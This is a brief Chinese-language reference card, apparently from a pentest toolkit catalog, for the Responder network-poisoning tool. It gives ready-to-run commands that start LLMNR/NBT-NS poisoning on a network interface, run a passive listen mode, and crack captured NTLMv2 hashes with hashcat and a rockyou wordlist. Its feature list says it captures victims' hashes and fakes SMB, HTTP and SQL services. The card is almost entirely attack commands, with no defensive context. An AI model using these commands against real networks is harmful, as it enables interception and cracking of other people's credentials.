### Responder

| 属性 | 值 |
|------|-----|
| 版本 | 3.1.3 |
| 平台 | Linux |
| 风险 | 🔴 高 |
| 标签 | `欺骗` `凭据窃取` `毒化` |

## Responder 网络毒化监听

### 在指定网卡开启 LLMNR/NBT-NS 毒化
```bash
bash responder_start.sh -I eth0 -rdw
```

### 仅监听模式，不发送毒化响应
```bash
bash responder_start.sh -I eth0 -A
```

### 使用 Hashcat 破解捕获的 NTLMv2 Hash
```bash
hashcat -m 5600 -a 0 hash.txt rockyou.txt
```

- ✓ 自动响应局域网内的名称解析请求
- ✓ 捕获受害者的 NTLMv1/v2 Hash
- 支持伪造多种协议服务 (SMB, HTTP, SQL等)
